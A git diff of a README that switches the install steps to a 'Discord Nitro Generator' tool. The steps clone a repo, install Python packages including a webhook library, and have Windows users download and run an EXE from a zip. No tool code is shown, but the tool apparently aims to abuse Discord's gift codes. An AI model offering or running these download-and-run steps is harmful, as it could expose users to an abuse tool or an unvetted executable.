@@ -4,16 +4,23 @@ ScreenShot:
 ## Installation
 
 Linux:
-
 ```sh
-git clone https://github.com/logicguy1/The-all-in-one-discord-tool.git
-#after do that just u need to do it
+git clone https://github.com/gamer13alone/DNG
 ```
-
-Windows:
-
 ```sh
-edit autoexec.bat
+python3.8 -m pip install requests
+python3.8 -m pip install discord_webhook
+python3.8 -m pip install colored
+```
+```
+python3 dng_by_gl_aria.py
+```
+Windows:
+```sh
+#first you need to downlowd some files
+https://github.com/gamer13alone/DNG/raw/main/DNG%20EXE%20Edition.zip
+#after donwlod you need to extract zip file
+#after extract downlowded file just open extracted folder and run DNG (Discord Nitro Generator)
 ```
 
 ## Usage example
